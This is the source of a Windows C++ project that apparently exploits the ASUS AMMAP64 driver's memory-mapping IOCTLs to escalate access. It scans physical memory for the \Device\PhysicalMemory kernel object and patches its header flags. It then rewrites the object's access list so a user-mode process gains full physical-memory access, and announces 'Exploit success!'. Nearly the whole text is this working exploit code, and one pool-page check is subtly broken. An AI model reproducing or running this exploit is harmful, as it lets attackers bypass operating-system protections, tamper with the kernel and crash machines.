Project Path: arc_gmh5225_EUPMAccess_73svo_yy

Source Tree:

```txt
arc_gmh5225_EUPMAccess_73svo_yy
├── EnablePhysicalMemory
│   ├── AMMAP64.cpp
│   ├── AMMAP64.h
│   ├── EnablePhysicalMemory.cpp
│   ├── EnablePhysicalMemory.h
│   ├── Superfetch.cpp
│   ├── Superfetch.h
│   ├── SuperfetchNative.h
│   └── ntdll.h
├── EnablePhysicalMemory.sln
├── README.md
└── asus.bat

```

`EnablePhysicalMemory.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27004.2002
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "EnablePhysicalMemory", "EnablePhysicalMemory\EnablePhysicalMemory.vcxproj", "{643231AB-55CD-4890-9E4B-3A683579F014}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{643231AB-55CD-4890-9E4B-3A683579F014}.Debug|x64.ActiveCfg = Debug|x64
		{643231AB-55CD-4890-9E4B-3A683579F014}.Debug|x64.Build.0 = Debug|x64
		{643231AB-55CD-4890-9E4B-3A683579F014}.Debug|x86.ActiveCfg = Debug|Win32
		{643231AB-55CD-4890-9E4B-3A683579F014}.Debug|x86.Build.0 = Debug|Win32
		{643231AB-55CD-4890-9E4B-3A683579F014}.Release|x64.ActiveCfg = Release|x64
		{643231AB-55CD-4890-9E4B-3A683579F014}.Release|x64.Build.0 = Release|x64
		{643231AB-55CD-4890-9E4B-3A683579F014}.Release|x86.ActiveCfg = Release|Win32
		{643231AB-55CD-4890-9E4B-3A683579F014}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {7ABAAF55-5DEC-450E-8D75-5E8D8464F4C8}
	EndGlobalSection
EndGlobal

```

`EnablePhysicalMemory/AMMAP64.cpp`:

```cpp
#include "AMMAP64.h"
#include <Windows.h>

HANDLE OpenDriver() {
	return CreateFileA(DEVICENAME, GENERIC_READ | GENERIC_WRITE | FILE_GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY, 0);
}

bool DriverMapMemory(HANDLE hDriver, IoCommand* myIo) {
	DWORD read = 0;
	return DeviceIoControl(hDriver, IOCTL_MAPMEMORY, myIo, sizeof(*myIo), myIo, sizeof(*myIo), &read, 0);

}
bool DriverUnmapMemory(HANDLE hDriver, IoCommand* myIo) {
	DWORD read = 0;
	return DeviceIoControl(hDriver, IOCTL_UNMAPMEM, myIo, sizeof(*myIo), myIo, sizeof(*myIo), &read, 0);
}

bool CloseDriver(HANDLE hDriver) {
	return CloseHandle(hDriver);
}
```

`EnablePhysicalMemory/AMMAP64.h`:

```h
#pragma once

#include <stdint.h>
#include <windows.h>
#include <winternl.h>

struct IoCommand {
	_In_ uint64_t offset;
	_Out_ uint64_t virtualmemory;
	_Inout_ LARGE_INTEGER read;
};

#define IOCTL_MAPMEMORY 0x9C402580
#define IOCTL_UNMAPMEM 0x9C402584

#define DEVICENAME "\\\\.\\ASMMAP64"


HANDLE OpenDriver();
bool DriverMapMemory(HANDLE, IoCommand*);
bool DriverUnmapMemory(HANDLE, IoCommand*);
bool CloseDriver(HANDLE);
```

`EnablePhysicalMemory/EnablePhysicalMemory.cpp`:

```cpp
#include "EnablePhysicalMemory.h"
#include "AMMAP64.h"

#include "Superfetch.h"

#ifndef _WIN64
#error This can only be compiled for 64bit
#endif

static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_T Length, PDWORD64 VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	viewBase;

	*VirtualAddress = 0;
	viewBase.QuadPart = (ULONGLONG) (*Address);
	ntStatus = ZwMapViewOfSection
		(
			PhysicalMemory,
			GetCurrentProcess(),
			(PVOID *) VirtualAddress,
			0L,
			*Length,
			&viewBase,
			Length,
			ViewShare,
			0,
			PAGE_READWRITE
		);

	if(!NT_SUCCESS(ntStatus)) return false;
	*Address = viewBase.LowPart;
	return true;
}

static BOOLEAN UnMapmemory(PDWORD64 Address)
{
	if(!ZwUnmapViewOfSection(GetCurrentProcess(), (PVOID) Address))
		return true;
	else
		return false;
}

static BOOLEAN ChangeSecurityDescriptorPhysicalMemory()
{
	EXPLICIT_ACCESS		Access;
	PACL				OldDacl = NULL, NewDacl = NULL;
	SECURITY_DESCRIPTOR security;
	ZeroMemory(&security, sizeof(SECURITY_DESCRIPTOR));

	PSECURITY_DESCRIPTOR	psecurity = &security;
	NTSTATUS				status;
	HANDLE					physmem;
	UNICODE_STRING			physmemString;
	OBJECT_ATTRIBUTES		attributes;
	WCHAR					physmemName[] = L"\\device\\physicalmemory";

	RtlInitUnicodeString(&physmemString, physmemName);

	InitializeObjectAttributes(&attributes, &physmemString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenSection(&physmem, WRITE_DAC | READ_CONTROL, &attributes);

	if(!NT_SUCCESS(status)) return false;

	GetSecurityInfo(physmem, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl, NULL, 0);

	Access.grfAccessPermissions = SECTION_ALL_ACCESS;
	Access.grfAccessMode = GRANT_ACCESS;
	Access.grfInheritance = NO_INHERITANCE;
	Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
	Access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	Access.Trustee.TrusteeType = TRUSTEE_IS_USER;
	Access.Trustee.ptstrName = L"CURRENT_USER";

	SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);

	SetSecurityInfo(physmem, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, NULL);

	CloseHandle(physmem);
	return true;
};


static HANDLE OpenPhysicalMemory()
{
	UNICODE_STRING		physmemString;
	OBJECT_ATTRIBUTES	attributes;
	WCHAR				physmemName[] = L"\\device\\physicalmemory";
	NTSTATUS			status;
	HANDLE				physmem;

	RtlInitUnicodeString(&physmemString, physmemName);

	InitializeObjectAttributes(&attributes, &physmemString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenSection(&physmem, SECTION_ALL_ACCESS, &attributes);

	if(!NT_SUCCESS(status))
	{
		printf("%08x\n", status);
		return NULL;
	}

	return physmem;
}

int isAscii(int c)
{
	return((c >= 'A' && c <= 'z') || (c >= '0' && c <= '9') || c == 0x20 || c == '@' || c == '_' || c == '?');
}

int isPrintable(uint32_t uint32)
{
	if((isAscii((uint32 >> 24) & 0xFF)) && (isAscii((uint32 >> 16) & 0xFF)) && (isAscii((uint32 >> 8) & 0xFF)) &&
	   (isAscii((uint32) & 0xFF)))
		return true;
	else
		return false;
}


bool isInsidePhysicalRAM(uint64_t addr, SFMemoryInfo* mi, int nOfRange) {
	for (int i = 0; i < nOfRange; i++) 
		if (mi[i].Start <= addr && addr <= mi[i].End)
			return true;
	return false;
}

bool isPoolPage(uint64_t addr, PfnList* pfnList) {
	return pfnList[(addr / 0x1000)].isPool;
}
int main()
{
	printf("Usermode physical memory access enabler\n");
	printf("Tested only on Win10 x64, might BSOD your machine.\n");
	printf("If you're sure you want to continue, press any key otherwise close this window.\n");

	getchar();

	auto hDriver = OpenDriver();
	if (!hDriver || hDriver == (HANDLE)-1) {
		printf("Driver AMMAP64.sys is not running, launch the bat file...\n");
		system("pause");
		return 0;
	}

	if (!SFSetup()) {
		printf("You're not running with administrator privilege... relaunch with admin privileges to get access to required API.\n");
		system("pause");
	}

	SFMemoryInfo myRanges[32] = { 0 };
	int nOfRange = 0;
	auto pfnTable = SFGetMemoryInfo(myRanges, nOfRange);

	myRanges[nOfRange - 1].End -= 0x1000;
	IoCommand myIo = { 0 };
	myIo.offset = 0x0;

	myIo.read.QuadPart = 0x2000;
	
	bool bFound = false;
	if (DriverMapMemory(hDriver, &myIo)) {

		auto i = 0ULL;
		for (i = 0; i < myRanges[nOfRange - 1].End; i += 0x1000) {
			if (bFound) {
				DriverUnmapMemory(hDriver, &myIo);
				break;
			}
			if (!isInsidePhysicalRAM(i, myRanges, nOfRange))
				continue;
			if (!isPoolPage)
				continue;
			if (!DriverUnmapMemory(hDriver, &myIo))
				break;
			myIo.offset = i;
			if (!DriverMapMemory(hDriver, &myIo))
				break;
			uint8_t* lpCursor = (uint8_t*)(myIo.virtualmemory);
			uint32_t previousSize = 0;

			while (true) {
				auto pPoolHeader = (PPOOL_HEADER)lpCursor;
				auto blockSize = (pPoolHeader->BlockSize << 4);
				auto previousBlockSize = (pPoolHeader->PreviousSize << 4);

				if (previousBlockSize != previousSize ||
					blockSize == 0 ||
					blockSize >= 0xFFF ||
					!isPrintable(pPoolHeader->PoolTag & 0x7FFFFFFF))
					break;

				previousSize = blockSize;

				if (0x74636553 == pPoolHeader->PoolTag &0x7FFFFFFF) {
					auto pObjectHeader = (POBJECT_HEADER)(lpCursor + 0x30);
					if (pObjectHeader->HandleCount >= 0  && pObjectHeader->HandleCount <= 3  && pObjectHeader->KernelObject == 1 && pObjectHeader->Flags == 0x16 && pObjectHeader->KernelOnlyAccess == 1)
					{
						printf("Found PhysicalMemory Object Header at %p\n", lpCursor += 0x30);
						pObjectHeader->KernelObject = 0;
						pObjectHeader->KernelOnlyAccess = 0;
						bFound = true;
						break;
					}
				}
					
				lpCursor += blockSize;
				if ((lpCursor - ((uint8_t*)myIo.virtualmemory)) >= 0x1000)
					break;

			}
		}
	}
	if (!bFound) {
		printf("Read %lld bytes without finding the physical address, did you already patch?\nTesting access... (requires administrator or it will fail.)\n", myIo.offset);
		
	}
	CloseDriver(hDriver);
	if (!ChangeSecurityDescriptorPhysicalMemory()) {
		printf("Failed to open hande on \\Device\\PhysicalMemory from usermode, either you don't have Administrator privilege or the exploit failed.\n");
		system("pause");
		return 0;
	}
	auto hMemory = OpenPhysicalMemory();
	if (hMemory && hMemory != (HANDLE)-1) {
		CloseHandle(hMemory);
		printf("Exploit success!\n");
		printf("You can now map \Device\PhysicalMemory from usermode, check https://github.com/waryas/UMPMLib/ as a guideline.\n");
		system("pause");
		return 0;
	}
	
	printf("Exploit failed...\n");
	system("pause");

	
	
	

	return 0;
}

```

`EnablePhysicalMemory/EnablePhysicalMemory.h`:

```h

#include <windows.h>
#include <winternl.h>
#include <AccCtrl.h>
#include <Aclapi.h>
#include <stdint.h>
#include <stdio.h>

#include "ntdll.h"

#define PHYSICAL_ADDRESS	LARGE_INTEGER

typedef struct _POOL_HEADER
{
	union
	{
		struct
		{
#if defined(_AMD64_)
			ULONG	PreviousSize : 8;
			ULONG	PoolIndex : 8;
			ULONG	BlockSize : 8;
			ULONG	PoolType : 8;
#else
			USHORT	PreviousSize : 9;
			USHORT	PoolIndex : 7;
			USHORT	BlockSize : 9;
			USHORT	PoolType : 7;
#endif
		};
		ULONG	Ulong1;
	};
#if defined(_WIN64)
	ULONG	PoolTag;
#endif
	union
	{
#if defined(_WIN64)
		void	*ProcessBilled;
#else
		ULONG	PoolTag;
#endif
		struct
		{
			USHORT	AllocatorBackTraceIndex;
			USHORT	PoolTagHash;
		};
	};
} POOL_HEADER, *PPOOL_HEADER;

typedef struct _OBJECT_HEADER
{
	LONG	PointerCount;
	union
	{
		LONG	HandleCount;
		PVOID	NextToFree;
	};
	uint64_t	Lock;
	UCHAR		TypeIndex;
	union
	{
		UCHAR	TraceFlags;
		struct
		{
			UCHAR	DbgRefTrace : 1;
			UCHAR	DbgTracePermanent : 1;
			UCHAR	Reserved : 6;
		};
	};
	UCHAR	InfoMask;
	union
	{
		UCHAR	Flags;
		struct
		{
			UCHAR	NewObject : 1;
			UCHAR	KernelObject : 1;
			UCHAR	KernelOnlyAccess : 1;
			UCHAR	ExclusiveObject : 1;
			UCHAR	PermanentObject : 1;
			UCHAR	DefaultSecurityQuota : 1;
			UCHAR	SingleHandleEntry : 1;
			UCHAR	DeletedInline : 1;
		};
	};
	union
	{
		PVOID	ObjectCreateInfo;
		PVOID	QuotaBlockCharged;
	};
	PVOID	SecurityDescriptor;
	PVOID	Body;
} OBJECT_HEADER, *POBJECT_HEADER;

```

`EnablePhysicalMemory/Superfetch.cpp`:

```cpp
#include "Superfetch.h"
#include "SuperfetchNative.h"
#include <Windows.h>
#include <memory>

template<typename SYS_TYPE>
std::unique_ptr<SYS_TYPE>
QueryInfo(
	__in SYSTEM_INFORMATION_CLASS sysClass
)
{
	size_t size = sizeof(RTL_PROCESS_MODULES) + SPAGE_SIZE;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	void* info = malloc(size);
	if (!info)
		return std::unique_ptr<SYS_TYPE>(nullptr);

	for (; STATUS_INFO_LENGTH_MISMATCH == status; size *= 2)
	{
		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)sysClass,
			info,
			size,
			nullptr);

		info = realloc(info, size * 2);
		if (!info)
			break;
	}

	std::unique_ptr<SYS_TYPE> r_info = std::unique_ptr<SYS_TYPE>(static_cast<SYS_TYPE*>(info));
	return r_info;
}

inline void SFBuildInfo(IN PSUPERFETCH_INFORMATION SuperfetchInfo, IN PVOID Buffer, IN ULONG Length, IN SUPERFETCH_INFORMATION_CLASS InfoClass) {
	SuperfetchInfo->Version = SUPERFETCH_VERSION;
	SuperfetchInfo->Magic = SUPERFETCH_MAGIC;
	SuperfetchInfo->Data = Buffer;
	SuperfetchInfo->Length = Length;
	SuperfetchInfo->InfoClass = InfoClass;
}

bool SFSetup()
{
	BOOLEAN old;
	auto status = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &old);
	status |= RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old);
	if (!NT_SUCCESS(status))
		return false;

	SYSTEM_BASIC_INFORMATION basicInfo;

	status = NtQuerySystemInformation(SystemBasicInformation,
		&basicInfo, sizeof(SYSTEM_BASIC_INFORMATION), nullptr);
	if (!NT_SUCCESS(status)) 
		return false;


	return true;
}

PfnList* SFGetMemoryInfo(SFMemoryInfo* pInfo, int& rCount)
{
	PPF_MEMORY_RANGE_INFO MemoryRanges;	
	SUPERFETCH_INFORMATION SuperfetchInfo;
	ULONG ResultLength = 0;
	PF_MEMORY_RANGE_INFO MemoryRangeInfo;
	MemoryRangeInfo.Version = 1;
	SFBuildInfo(&SuperfetchInfo, &MemoryRangeInfo, sizeof(MemoryRangeInfo), SuperfetchMemoryRangesQuery);

	if (
		NtQuerySystemInformation(SystemSuperfetchInformation, &SuperfetchInfo, sizeof(SuperfetchInfo), &ResultLength) 
		== STATUS_BUFFER_TOO_SMALL) 
	{
		MemoryRanges = static_cast<PPF_MEMORY_RANGE_INFO>(HeapAlloc(GetProcessHeap(), 0, ResultLength));
		MemoryRanges->Version = 1;
		SFBuildInfo(&SuperfetchInfo, MemoryRanges, ResultLength, SuperfetchMemoryRangesQuery);
		if (!NT_SUCCESS(NtQuerySystemInformation(SystemSuperfetchInformation, &SuperfetchInfo, sizeof(SuperfetchInfo), &ResultLength)))
			return false;
	}
	else {
		MemoryRanges = &MemoryRangeInfo;
	}

	rCount = 0;
	PPHYSICAL_MEMORY_RUN Node;
	auto MmHighestPhysicalPageNumber = 0;
	for (ULONG i = 0; i < MemoryRanges->RangeCount; i++) {
		Node = reinterpret_cast<PPHYSICAL_MEMORY_RUN>(&MemoryRanges->Ranges[i]);
		pInfo[i].Start = Node->BasePage << PAGE_SHIFT;
		pInfo[i].End = (Node->BasePage + Node->PageCount) << PAGE_SHIFT;
		MmHighestPhysicalPageNumber = Node->BasePage + Node->PageCount;
		pInfo[i].PageCount = Node->PageCount;
		pInfo[i].Size = ((Node->PageCount << PAGE_SHIFT) >> 10) * 1024; // kb to byte
		rCount++;
	}

	auto PfnCount = MmHighestPhysicalPageNumber;
	auto MmPfnDatabaseSize = FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) + PfnCount * sizeof(MMPFN_IDENTITY);
	auto MmPfnDatabase = static_cast<PPF_PFN_PRIO_REQUEST>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MmPfnDatabaseSize));

	MmPfnDatabase->Version = 1;
	MmPfnDatabase->RequestFlags = 1;

	SFBuildInfo(&SuperfetchInfo,
		MmPfnDatabase,
		MmPfnDatabaseSize,
		SuperfetchPfnQuery);

	for (auto k = 0, i = 0; i < MemoryRanges->RangeCount; i++) {

		Node = reinterpret_cast<PPHYSICAL_MEMORY_RUN>(&MemoryRanges->Ranges[i]);
		for (SIZE_T j = Node->BasePage; j < (Node->BasePage + Node->PageCount); j++) {
			auto Pfn1 = MI_GET_PFN(k++);
			Pfn1->PageFrameIndex = j;

		}
		MmPfnDatabase->PfnCount = k;
	}

	auto Status = NtQuerySystemInformation(SystemSuperfetchInformation, &SuperfetchInfo, sizeof(SuperfetchInfo), &ResultLength);

	if (!Status) //Success
	{
		PfnList *myPfn = (PfnList*)malloc(sizeof(PfnList)*MmHighestPhysicalPageNumber);
		memset(myPfn, 0, sizeof(PfnList) * MmPfnDatabase->PfnCount);
		for (auto i = 0; i < MmPfnDatabase->PfnCount; i++) {
			if (MmPfnDatabase->PageData[i].u1.e1.UseDescription == 4 || MmPfnDatabase->PageData[i].u1.e1.UseDescription == 5)
				myPfn[MmPfnDatabase->PageData[i].PageFrameIndex].isPool = true;
		}
		return myPfn;
	}

	return false;
}

uint64_t SFGetNtBase()
{
	auto module_info = QueryInfo<RTL_PROCESS_MODULES>(SystemModuleInformation);

	if (module_info.get() && module_info->NumberOfModules)
		return reinterpret_cast<size_t>(module_info->Modules[0].ImageBase);
	return 0;
}

uint64_t SFGetWin32kBase()
{
	return SFGetModuleBase("win32k.sys");
}

uint64_t SFGetHalBase()
{
	return SFGetModuleBase("hal.sys");
}

uint64_t SFGetModuleBase(char* module)
{
	auto module_info = QueryInfo<RTL_PROCESS_MODULES>(SystemModuleInformation);

	for (size_t i = 0; i < module_info->NumberOfModules; i++)
		if (!_strnicmp(module, module_info.get()->Modules[i].FullPathName + module_info->Modules[i].OffsetToFileName, strlen(module)+1))
			return reinterpret_cast<size_t>(module_info->Modules[i].ImageBase);

	return 0;
}

uint64_t SFGetEProcess(int pid)
{
	auto handle_info = QueryInfo<SYSTEM_HANDLE_INFORMATION>(SystemHandleInformation);
	if (!handle_info.get())
		return 0;

	for (size_t i = 0; i < handle_info->HandleCount; i++)
		if (pid == handle_info->Handles[i].ProcessId && 7 == handle_info->Handles[i].ObjectTypeNumber)
			return reinterpret_cast<size_t>(handle_info->Handles[i].Object);

	return 0;
}
```

`EnablePhysicalMemory/Superfetch.h`:

```h
#ifndef _SUPERFETCH_H
#define _SUPERFETCH_H
#include <stdint.h>

struct SFMemoryInfo
{
	uint64_t Start;
	uint64_t End;
	int PageCount;
	uint64_t Size;
};

struct PfnList {
	bool isPool;
};

bool     SFSetup();
PfnList* SFGetMemoryInfo(SFMemoryInfo* pInfo, int& rCount);
uint64_t SFGetModuleBase(char* module);
uint64_t SFGetNtBase();
uint64_t SFGetWin32kBase();
uint64_t SFGetHalBase();
uint64_t SFGetEProcess(int pid);


#endif
```

`EnablePhysicalMemory/SuperfetchNative.h`:

```h
#ifndef _SUPERFETCH_NATIVE_H
#define _SUPERFETCH_NATIVE_H
#pragma comment(lib, "ntdll.lib")
#define _AMD64_
#include <minwindef.h>

typedef long NTSTATUS, *PNTSTATUS;
#define NT_SUCCESS(Status)              (((NTSTATUS)(Status)) >= 0)
#include <ntstatus.h>



typedef enum _SUPERFETCH_INFORMATION_CLASS {
	SuperfetchRetrieveTrace = 1,        // Query
	SuperfetchSystemParameters = 2,     // Query
	SuperfetchLogEvent = 3,             // Set
	SuperfetchGenerateTrace = 4,        // Set
	SuperfetchPrefetch = 5,             // Set
	SuperfetchPfnQuery = 6,             // Query
	SuperfetchPfnSetPriority = 7,       // Set
	SuperfetchPrivSourceQuery = 8,      // Query
	SuperfetchSequenceNumberQuery = 9,  // Query
	SuperfetchScenarioPhase = 10,       // Set
	SuperfetchWorkerPriority = 11,      // Set
	SuperfetchScenarioQuery = 12,       // Query
	SuperfetchScenarioPrefetch = 13,    // Set
	SuperfetchRobustnessControl = 14,   // Set
	SuperfetchTimeControl = 15,         // Set
	SuperfetchMemoryListQuery = 16,     // Query
	SuperfetchMemoryRangesQuery = 17,   // Query
	SuperfetchTracingControl = 18,       // Set
	SuperfetchTrimWhileAgingControl = 19,
	SuperfetchInformationMax = 20
} SUPERFETCH_INFORMATION_CLASS;

//
// Buffer for NtQuery/SetInformationSystem for the Superfetch Class
//
typedef struct _SUPERFETCH_INFORMATION {
	ULONG Version;
	ULONG Magic;
	SUPERFETCH_INFORMATION_CLASS InfoClass;
	PVOID Data;
	ULONG Length;
} SUPERFETCH_INFORMATION, *PSUPERFETCH_INFORMATION;

typedef struct _RTL_BITMAP {
	ULONG SizeOfBitMap;
	PULONG Buffer;
} RTL_BITMAP, *PRTL_BITMAP;




typedef struct _PF_PHYSICAL_MEMORY_RANGE {
	ULONG_PTR BasePfn;
	ULONG_PTR PageCount;
} PF_PHYSICAL_MEMORY_RANGE, *PPF_PHYSICAL_MEMORY_RANGE;

typedef struct _PF_MEMORY_RANGE_INFO {
	ULONG Version;
	ULONG RangeCount;
	PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
} PF_MEMORY_RANGE_INFO, *PPF_MEMORY_RANGE_INFO;

typedef struct _PHYSICAL_MEMORY_RUN {
	SIZE_T BasePage;
	SIZE_T PageCount;
} PHYSICAL_MEMORY_RUN, *PPHYSICAL_MEMORY_RUN;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation, /// Obsolete: Use KUSER_SHARED_DATA
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,  // used to be SystemLoadAndCallImage
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	SystemPowerInformationNative,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemAddVerifier,
	SystemSessionProcessesInformation,
	SystemLoadGdiDriverInSystemSpaceInformation,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,
	SystemEmulationProcessorInformation,
	SystemExtendedHanfleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchDogTimerHandler,
	SystemWatchDogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWo64SharedInformationObosolete,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	SystemThreadPriorityClientIdInformation,
	SystemProcessorIdleCycleTimeInformation,
	SystemVerifierCancellationInformation,
	SystemProcessorPowerInformationEx,
	SystemRefTraceInformation,
	SystemSpecialPoolInformation,
	SystemProcessIdInformation,
	SystemErrorPortInformation,
	SystemBootEnvironmentInformation,
	SystemHypervisorInformation,
	SystemVerifierInformationEx,
	SystemTimeZoneInformation,
	SystemImageFileExecutionOptionsInformation,
	SystemCoverageInformation,
	SystemPrefetchPathInformation,
	SystemVerifierFaultsInformation,
	MaxSystemInfoClass,
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_BASIC_INFORMATION {
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	ULONG NumberOfPhysicalPages;
	ULONG LowestPhysicalPageNumber;
	ULONG HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	ULONG_PTR ActiveProcessorsAffinityMask;
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

struct RTL_PROCESS_MODULE_INFORMATION
{
	unsigned int Section;
	void* MappedBase;
	void* ImageBase;
	unsigned int ImageSize;
	unsigned int Flags;
	unsigned short LoadOrderIndex;
	unsigned short InitOrderIndex;
	unsigned short LoadCount;
	unsigned short OffsetToFileName;
	char FullPathName[256];
};

struct RTL_PROCESS_MODULES
{
	unsigned int NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[0];
};

struct SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
};

struct SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[0];
};

extern "C" NTSTATUS WINAPI NtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);


#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << 12)

#define SE_DEBUG_PRIVILEGE                (20L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE  (13L)

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(
	IN ULONG Privilege,
	IN BOOLEAN NewValue,
	IN BOOLEAN ForThread,
	OUT PBOOLEAN OldValue
);

#define SPAGE_SIZE              0x1000
#define SUPERFETCH_VERSION      45
#define SUPERFETCH_MAGIC        'kuhC'

#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
#define MI_GET_PFN(x)                   (PMMPFN_IDENTITY)(&MmPfnDatabase->PageData[(x)])

typedef struct _SYSTEM_MEMORY_LIST_INFORMATION {
	SIZE_T ZeroPageCount;
	SIZE_T FreePageCount;
	SIZE_T ModifiedPageCount;
	SIZE_T ModifiedNoWritePageCount;
	SIZE_T BadPageCount;
	SIZE_T PageCountByPriority[8];
	SIZE_T RepurposedPagesByPriority[8];
	ULONG_PTR ModifiedPageCountPageFile;
} SYSTEM_MEMORY_LIST_INFORMATION, *PSYSTEM_MEMORY_LIST_INFO;

typedef struct _MEMORY_FRAME_INFORMATION {
	ULONGLONG UseDescription : 4;
	ULONGLONG ListDescription : 3;
	ULONGLONG Reserved0 : 1;
	ULONGLONG Pinned : 1;
	ULONGLONG DontUse : 48;
	ULONGLONG Priority : 3;
	ULONGLONG Reserved : 4;
} MEMORY_FRAME_INFORMATION, *PMEMORY_FRAME_INFORMATION;

typedef struct _FILEOFFSET_INFORMATION {
	ULONGLONG DontUse : 9;
	ULONGLONG Offset : 48;
	ULONGLONG Reserved : 7;
} FILEOFFSET_INFORMATION, *PFILEOFFSET_INFORMATION;

typedef struct _PAGEDIR_INFORMATION {
	ULONGLONG DontUse : 9;
	ULONGLONG PageDirectoryBase : 48;
	ULONGLONG Reserved : 7;
} PAGEDIR_INFORMATION, *PPAGEDIR_INFORMATION;

typedef struct _UNIQUE_PROCESS_INFORMATION {
	ULONGLONG DontUse : 9;
	ULONGLONG UniqueProcessKey : 48;
	ULONGLONG Reserved : 7;
} UNIQUE_PROCESS_INFORMATION, *PUNIQUE_PROCESS_INFORMATION;

typedef struct _MMPFN_IDENTITY {
	union {
		MEMORY_FRAME_INFORMATION e1;
		FILEOFFSET_INFORMATION e2;
		PAGEDIR_INFORMATION e3;
		UNIQUE_PROCESS_INFORMATION e4;
	} u1;
	SIZE_T PageFrameIndex;
	union {
		struct {
			ULONG Image : 1;
			ULONG Mismatch : 1;
		} e1;
		PVOID FileObject;
		PVOID UniqueFileObjectKey;
		PVOID ProtoPteAddress;
		PVOID VirtualAddress;
	} u2;
} MMPFN_IDENTITY, *PMMPFN_IDENTITY;

typedef struct _PF_PFN_PRIO_REQUEST {
	ULONG Version;
	ULONG RequestFlags;
	SIZE_T PfnCount;
	SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
	MMPFN_IDENTITY PageData[256];
} PF_PFN_PRIO_REQUEST, *PPF_PFN_PRIO_REQUEST;

#endif
```

